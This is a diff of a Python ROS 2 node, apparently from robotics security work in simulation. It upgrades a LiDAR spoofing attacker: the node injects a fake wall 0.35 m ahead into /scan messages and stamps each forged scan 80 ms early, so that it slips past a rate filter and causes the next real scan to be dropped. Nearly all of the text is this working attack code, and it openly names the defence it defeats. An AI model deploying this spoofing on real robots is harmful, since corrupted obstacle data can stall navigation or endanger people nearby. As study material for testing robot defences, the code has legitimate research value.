@@ -6,28 +6,28 @@ from rclpy.node import Node
 from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy
 from sensor_msgs.msg import LaserScan
 
-
 SENSOR_QOS = QoSProfile(
     depth=10,
     reliability=ReliabilityPolicy.BEST_EFFORT,
     durability=DurabilityPolicy.VOLATILE,
 )
-
-# Nav2 costmap subscribes to /scan with RELIABLE — use this for our publisher
 PUB_QOS = QoSProfile(
     depth=10,
     reliability=ReliabilityPolicy.RELIABLE,
     durability=DurabilityPolicy.VOLATILE,
 )
 
-WALL_RANGE = 0.35       # fake wall distance in metres
-WALL_HALF_DEG = 60      # degrees either side of forward
+WALL_RANGE = 0.35
+WALL_HALF_DEG = 60
+
+# Must be > rate filter's min interval (1/15Hz = 67ms) so the filter passes us,
+# but < real sensor interval (100ms) so the next real scan gets dropped.
+TIMESTAMP_OFFSET_NS = 80_000_000   # 80 ms
 
 
-class Attacker(Node):
+class Attacker2(Node):
     def __init__(self, **kwargs):
-        super().__init__('lidar_attacker', **kwargs)
-        self._latest = None
+        super().__init__('lidar_attacker2', **kwargs)
         self._logged = False
 
         self.sub = self.create_subscription(
@@ -35,35 +35,33 @@ class Attacker(Node):
         self.pub = self.create_publisher(
             LaserScan, '/scan', PUB_QOS)
 
-        self.timer = self.create_timer(1.0 / 30.0, self._publish)
-        self.get_logger().info('Attacker started — waiting for first scan...')
+        self.get_logger().info(
+            'Smart attacker active: timestamp-spoofed scans at ~10 Hz '
+            '(bypasses rate filter)')
 
     def _scan_cb(self, msg: LaserScan):
-        self._latest = msg
-
-    def _publish(self):
-        if self._latest is None:
-            return
-
-        msg = self._latest
         n = len(msg.ranges)
         angle_increment = msg.angle_increment
-        angle_min = msg.angle_min
-
-        # Index of angle=0 (robot forward direction)
-        # Works for both [0, 2π] and [-π, π] conventions
-        center = int(round(-angle_min / angle_increment)) % n
+        center = int(round(-msg.angle_min / angle_increment)) % n
         spread = int(round(math.radians(WALL_HALF_DEG) / angle_increment))
+
+        # Skip our own published scans to prevent a timestamp cascade
+        if abs(msg.ranges[center] - WALL_RANGE) < 0.01:
+            return
 
         if not self._logged:
             self.get_logger().info(
-                f'Scan: {n} ranges, angle_min={angle_min:.3f}, '
-                f'increment={angle_increment:.4f}, '
-                f'center_idx={center}, spread={spread}')
+                f'First real scan received — center_idx={center}, spread={spread}')
             self._logged = True
 
         fake = copy.deepcopy(msg)
-        fake.header.stamp = self.get_clock().now().to_msg()
+
+        # Stamp 80 ms ahead of real scan: passes the rate filter's 67 ms threshold,
+        # but causes the next real scan (arriving 20 ms later) to be dropped.
+        total_ns = msg.header.stamp.sec * 10**9 + msg.header.stamp.nanosec
+        total_ns += TIMESTAMP_OFFSET_NS
+        fake.header.stamp.sec = total_ns // 10**9
+        fake.header.stamp.nanosec = total_ns % 10**9
 
         for offset in range(-spread, spread + 1):
             fake.ranges[(center + offset) % n] = WALL_RANGE
@@ -73,7 +71,7 @@ class Attacker(Node):
 
 def main():
     rclpy.init()
-    node = Attacker(parameter_overrides=[
+    node = Attacker2(parameter_overrides=[
         rclpy.parameter.Parameter(
             'use_sim_time',
             rclpy.parameter.Parameter.Type.BOOL,
